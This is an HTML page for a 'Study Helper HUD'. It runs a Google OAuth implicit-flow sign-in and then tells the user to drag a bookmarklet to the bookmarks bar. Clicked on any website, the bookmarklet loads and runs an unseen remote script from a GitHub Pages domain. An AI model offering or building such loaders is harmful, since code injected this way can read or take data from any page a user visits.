<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Study Helper HUD</title>
    <style>
        body { font-family: -apple-system, sans-serif; background: #764ba2; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; text-align: center; }
        .card { background: white; color: #333; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); max-width: 400px; width: 90%; }
        .btn { background: #4285F4; color: white; border: none; padding: 15px 25px; border-radius: 8px; font-size: 18px; cursor: pointer; text-decoration: none; display: inline-block; margin-top: 20px; font-weight: bold; }
        #debug { font-size: 10px; margin-top: 20px; color: #999; }
    </style>
</head>
<body>
    <div class="card">
        <h1>ðŸ“š Study HUD</h1>
        <p>Your productivity companion is ready.</p>
        <button class="btn" onclick="startLogin()">Continue with Google</button>
        <div id="debug">Ready to connect...</div>
    </div>

    <script>
        const CONFIG = {
            // This matches your screenshot exactly
            CLIENT_ID: '1077007918337-8uodfrvo9gpcstel6bglh7e836dshobu.apps.googleusercontent.com',
            REDIRECT_URI: 'https://devsdig.github.io/educational-resources-cdn/'
        };

        function startLogin() {
            const authUrl = 'https://accounts.google.com/o/oauth2/v2/auth?' + new URLSearchParams({
                client_id: CONFIG.CLIENT_ID,
                redirect_uri: CONFIG.REDIRECT_URI,
                response_type: 'token id_token',
                scope: 'openid email profile',
                nonce: Math.random().toString(36).substring(2),
                prompt: 'select_account'
            }).toString();
            
            window.location.href = authUrl;
        }

        window.onload = () => {
            if (window.location.hash) {
                document.querySelector('.card').innerHTML = `
                    <h1>âœ… Connected!</h1>
                    <p>Drag this purple button to your bookmarks bar:</p>
                    <a href="javascript:(function(){var s=document.createElement('script');s.src='https://devsdig.github.io/educational-resources-cdn/calc.js?t='+Date.now();document.body.appendChild(s);})();" 
                       style="background:#764ba2; color:white; padding:15px 25px; border-radius:10px; text-decoration:none; display:inline-block; font-weight:bold;">
                       ðŸ§® Study HUD
                    </a>
                    <p style="font-size:12px; color: #666; margin-top: 15px;">Then click it on any site to open your HUD.</p>
                `;
            }
        };
    </script>
</body>
</html>
